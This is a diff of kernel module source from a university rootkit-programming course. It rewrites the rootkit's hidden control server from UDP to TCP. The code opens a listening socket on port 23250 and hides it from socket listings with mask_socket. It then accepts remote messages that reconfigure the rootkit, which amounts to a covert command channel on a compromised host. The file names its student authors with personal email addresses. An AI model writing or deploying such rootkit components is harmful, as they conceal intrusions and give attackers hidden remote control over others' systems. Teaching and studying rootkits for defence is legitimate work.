@@ -4,9 +4,9 @@
 /*   Course: Rootkit Programming                                               */
 /*   Semester: WS 2015/16                                                      */
 /*   Team: 105                                                                 */
-/*   Assignment: 7                                                             */
+/*   Assignment: 10                                                            */
 /*                                                                             */
-/*   Filename: udp_server.c                                                    */
+/*   Filename: tcp_server.c                                                    */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -15,14 +15,13 @@
 /*       Name: Nedko Stefanov Nedkov                                           */
 /*       Email: nedko.stefanov.nedkov@gmail.com                                */
 /*                                                                             */
-/*   Date: December 2015                                                       */
+/*   Date: January 2016                                                        */
 /*                                                                             */
-/*   Usage:                                                                    */
+/*   Usage: ...                                                                */
 /*                                                                             */
 /*******************************************************************************/
 
 #include <linux/kernel.h>
-#include <linux/module.h>
 #include <linux/kthread.h>
 #include <linux/netdevice.h>
 
@@ -38,13 +37,11 @@
 
 
 /* Definition of macros */
-#define PRINT(str) printk(KERN_INFO "rootkit udp_server: %s\n", (str))
+#define PRINT(str) printk(KERN_INFO "rootkit tcp_server: %s\n", (str))
 #define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
-#define CONF_BUFSIZE 1024
-#define DEFAULT_PORT 2325
-#define CONNECT_PORT 23
-#define INADDR_SEND INADDR_LOOPBACK
+#define LISTEN_PORT 23250
 #define MODULE_NAME "rootkit"
+#define CONF_BUFSIZE 1024
 
 
 /* Definition of global variables */
@@ -52,24 +49,22 @@ static int show_debug_messages;
 static struct kthread_t *kthread = NULL;
 
 
+/* Definition of data structs */
+struct kthread_t {
+	int running;
+	struct task_struct *thread;
+	struct socket *sock;
+	struct sockaddr_in addr;
+};
+
+
 /* Declaration of functions */
-int udp_server_init(int);
-int udp_server_exit(void);
+int tcp_server_init(int);
+int tcp_server_exit(void);
 
 static void ksocket_start(void);
 static int ksocket_receive(struct socket *sock, struct sockaddr_in *, unsigned char *, int);
 static int ksocket_send(struct socket *sock, struct sockaddr_in *, unsigned char *, int);
-
-
-/* Definition of data structs */
-struct kthread_t {
-	struct task_struct *thread;
-	struct socket *sock;
-	struct sockaddr_in addr;
-	struct socket *sock_send;
-	struct sockaddr_in addr_send;
-	int running;
-};
 
 
 /*******************************************************************************/
@@ -79,11 +74,11 @@ struct kthread_t {
 /*******************************************************************************/
 
 
-int udp_server_init(int debug_mode_on)
+int tcp_server_init(int debug_mode_on)
 {
 	show_debug_messages = debug_mode_on;
 
-	mask_socket("udp4", DEFAULT_PORT);
+	mask_socket("tcp4", LISTEN_PORT);
 
 	kthread = kmalloc(sizeof(struct kthread_t), GFP_KERNEL);
 	memset(kthread, 0, sizeof(struct kthread_t));
@@ -91,7 +86,7 @@ int udp_server_init(int debug_mode_on)
 	/* Start kernel thread */
 	kthread->thread = kthread_run((void *) ksocket_start, NULL, MODULE_NAME);
 	if (IS_ERR(kthread->thread)) {
-		DEBUG_PRINT("unable to start kernel thread");
+		DEBUG_PRINT("[Error] unable to start kernel thread");
 		kfree(kthread);
 		kthread = NULL;
 		return -ENOMEM;
@@ -103,12 +98,12 @@ int udp_server_init(int debug_mode_on)
 }
 
 
-int udp_server_exit(void)
+int tcp_server_exit(void)
 {
 	//int err;
 
 	if (kthread->thread == NULL)
-		DEBUG_PRINT("no udp server thread to kill");
+		DEBUG_PRINT("no tcp server thread to kill");
 	/*
 	else {
 		//mutex_lock(&fs_mutex);
@@ -118,16 +113,16 @@ int udp_server_exit(void)
 
 		//Wait for kernel thread to die
 		if (err < 0)
-			DEBUG_PRINT("unknown error occured while trying to terminate udp server thread");
+			DEBUG_PRINT("[Error] unknown error occured while trying to terminate tcp server thread");
 		else {
 			while (kthread->running == 1)
 				msleep(10);
-			DEBUG_PRINT("succesfully killed udp server thread");
+			DEBUG_PRINT("succesfully killed tcp server thread");
         }
 	}
 	*/
 
-	/* Free allocated resources before exit */
+	/* Free allocated resources before exiting */
 	if (kthread->sock != NULL) {
 		sock_release(kthread->sock);
 		kthread->sock = NULL;
@@ -144,6 +139,8 @@ int udp_server_exit(void)
 
 static void ksocket_start(void)
 {
+	int res;
+	struct socket *accept;
 	unsigned char buf[CONF_BUFSIZE+1];
 	int size;
 
@@ -159,60 +156,75 @@ static void ksocket_start(void)
 	mutex_unlock(&fs_mutex);
 	*/
 
-	/* Create a socket */
-	if ((sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock) < 0) ||
-			(sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock_send) < 0)) {
-		DEBUG_PRINT("unable to create a datagram socket");
+	/* Create listening socket */
+	res = sock_create_kern(AF_INET, SOCK_STREAM, IPPROTO_TCP, &kthread->sock);
+	if (res < 0) {
+		DEBUG_PRINT("[Error] unable to create listening socket");
 		goto out;
 	}
 
 	memset(&kthread->addr, 0, sizeof(struct sockaddr));
-	memset(&kthread->addr_send, 0, sizeof(struct sockaddr));
 	kthread->addr.sin_family = AF_INET;
-	kthread->addr_send.sin_family = AF_INET;
-
 	kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
-	kthread->addr_send.sin_addr.s_addr = htonl(INADDR_SEND);
+	kthread->addr.sin_port = htons(LISTEN_PORT);
 
-	kthread->addr.sin_port = htons(DEFAULT_PORT);
-	kthread->addr_send.sin_port = htons(CONNECT_PORT);
-
-	if ((kthread->sock->ops->bind(kthread->sock, (struct sockaddr *) &kthread->addr, sizeof(struct sockaddr)) < 0) ||
-			(kthread->sock_send->ops->connect(kthread->sock_send, (struct sockaddr *) &kthread->addr_send, sizeof(struct sockaddr), 0) < 0 )) {
-		DEBUG_PRINT("unable to bind or connect to socket");
+	res = kthread->sock->ops->bind(kthread->sock, (struct sockaddr *) &kthread->addr, sizeof(struct sockaddr));
+	if (res < 0) {
+		DEBUG_PRINT("[Error] unable to bind or connect to socket");
 		goto close_and_out;
 	}
 
-	printk(KERN_INFO "rootkit udp_server: listening on port %d\n", DEFAULT_PORT);
+	res = kthread->sock->ops->listen(kthread->sock, 1);
+	if (res) {
+		DEBUG_PRINT("[Error] unable to listen socket");
+		goto close_and_out;
+	}
+
+	printk(KERN_INFO "rootkit tcp_server: listening on port %d\n", LISTEN_PORT);
 
 	/* Main loop */
 	while (1) {
 		DEBUG_PRINT("waiting for connections");
+		
+		res = sock_create_kern(PF_INET, SOCK_STREAM, IPPROTO_TCP, &accept);
+		if (res < 0) {
+			DEBUG_PRINT("[Error] unable to create accept socket");
+			goto close_and_out;
+		}
+
+		res = accept->ops->accept(kthread->sock, accept, 0);
+		if (res < 0) {
+			DEBUG_PRINT("[Error] unable to accept socket");
+			goto close_and_out;
+		}
+
 		memset(&buf, 0, CONF_BUFSIZE+1);
-		size = ksocket_receive(kthread->sock, &kthread->addr, buf, CONF_BUFSIZE);
+		size = ksocket_receive(accept, &kthread->addr, buf, CONF_BUFSIZE);
 
 		if (signal_pending(current))
 			break;
 
 		if (size < 0)
-			printk(KERN_INFO "rootkit udp_server: error getting datagram, sock_recvmsg error = %d\n", size);
+			printk(KERN_INFO "rootkit tcp_server: [Error] unable to receive packet (sock_recvmsg error = %d)\n", size);
 		else {
-			printk(KERN_INFO "rootkit udp_server: received %d bytes\n", size);
+			printk(KERN_INFO "rootkit tcp_server: received %d bytes\n", size);
+
 			/* Process data */
 			update_conf(buf);
 
-			/* Respond */
+			/* Respond back */
 			memset(buf, 0, CONF_BUFSIZE+1);
-			strcat(buf, "Done...");
-			ksocket_send(kthread->sock_send, &kthread->addr_send, buf, strlen(buf));
+			strcat(buf, "Updating rootkit configuration... [Done]");
+			ksocket_send(accept, NULL, buf, strlen(buf));
 		}
+
+		sock_release(accept);
+		accept = NULL;
 	}
 
 	close_and_out:
 		sock_release(kthread->sock);
-		sock_release(kthread->sock_send);
 		kthread->sock = NULL;
-		kthread->sock_send = NULL;
 	out:
 		kthread->thread = NULL;
 		kthread->running = 0;
@@ -221,10 +233,10 @@ static void ksocket_start(void)
 
 static int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsigned char* buf, int len)
 {
+	int size;
 	struct iovec iov;
 	struct msghdr msg;
 	mm_segment_t oldfs;
-	int size;
 
 	if (sock->sk == NULL)
 		return 0;
@@ -245,7 +257,7 @@ static int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsign
 
 	oldfs = get_fs();
 	set_fs(KERNEL_DS);
-	size = sock_recvmsg(sock,&msg,len,msg.msg_flags);
+	size = sock_recvmsg(sock, &msg, len, msg.msg_flags);
 	set_fs(oldfs);
 
 	return size;
@@ -254,10 +266,10 @@ static int ksocket_receive(struct socket* sock, struct sockaddr_in* addr, unsign
 
 static int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned char *buf, int len)
 {
+	int size;
 	struct iovec iov;
 	struct msghdr msg;
 	mm_segment_t oldfs;
-	int size;
 
 	if (sock->sk == NULL)
 		return 0;
@@ -269,7 +281,8 @@ static int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned 
 
 	msg.msg_flags = 0;
 	msg.msg_name = addr;
-	msg.msg_namelen  = sizeof(struct sockaddr_in);
+	// TODO: fix below
+	msg.msg_namelen = 0; //sizeof(struct sockaddr_in);
 	msg.msg_control = NULL;
 	msg.msg_controllen = 0;
 	//msg.msg_iov = &iov;
@@ -278,9 +291,8 @@ static int ksocket_send(struct socket *sock, struct sockaddr_in *addr, unsigned 
 
 	oldfs = get_fs();
 	set_fs(KERNEL_DS);
-	size = sock_sendmsg(sock,&msg);
+	size = sock_sendmsg(sock, &msg);
 	set_fs(oldfs);
 
 	return size;
 }
-
